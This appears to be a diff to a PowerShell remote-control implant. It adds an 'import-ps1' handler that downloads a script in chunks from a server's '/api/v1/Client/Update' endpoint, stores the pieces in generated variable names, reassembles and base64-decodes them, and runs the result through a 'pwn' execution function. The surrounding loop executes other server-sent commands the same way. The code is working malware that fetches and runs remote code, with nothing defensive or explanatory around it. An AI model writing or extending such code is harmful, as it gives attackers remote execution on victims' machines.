@@ -125,6 +125,38 @@ while ($true) {
          }
       } }
 
+   if ($invoke64 -like "import-ps1*") {
+      $invoke64 = $null
+      $chunk_index = 0
+      while ($true) {
+         $download = $(Send-HttpRequest "$server/api/v1/Client/Update?index=$chunk_index" "GET") 2> $null
+         if ($download -eq "FileChunkDone") { break }
+         if ($download -like "FileChunk:*") {
+            $chunk_parts = $download.ToString().Split(":", 4)
+            if ($chunk_parts.Length -lt 4) { break }
+            $is_last = $chunk_parts[2]
+            $chunk_payload = $chunk_parts[3]
+            $var_name = [string][char]([int][char]"a" + ($chunk_index % 26))
+            if ($chunk_index -ge 26) { $var_name += [string][int]($chunk_index / 26) }
+            Set-Variable -Name $var_name -Value $chunk_payload
+            if ($is_last -eq "1") { break }
+            $chunk_index += 1
+         }
+         else { break }
+      }
+      $script_b64 = ""
+      for ($i = 0; $i -le $chunk_index; $i++) {
+         $var_name = [string][char]([int][char]"a" + ($i % 26))
+         if ($i -ge 26) { $var_name += [string][int]($i / 26) }
+         $script_b64 += (Get-Variable -Name $var_name -ValueOnly)
+      }
+      if ($script_b64 -ne "") {
+         $script_bytes = $(R64Decoder -f $script_b64) 2> $null
+         $script_text = [System.Text.Encoding]::UTF8.GetString($script_bytes) 2> $null
+         $errorlog = $($commandx = pwn ($script_text) | Out-String) 2>&1
+      }
+   }
+
    if ($invoke64 -eq "exit") { exit }
 
    if ($pwshversion -gt 4) { if ($invoke64) { $errorlog = $($commandx = pwn ("$invoke64 $redirectors") | Out-String) 2>&1 }}
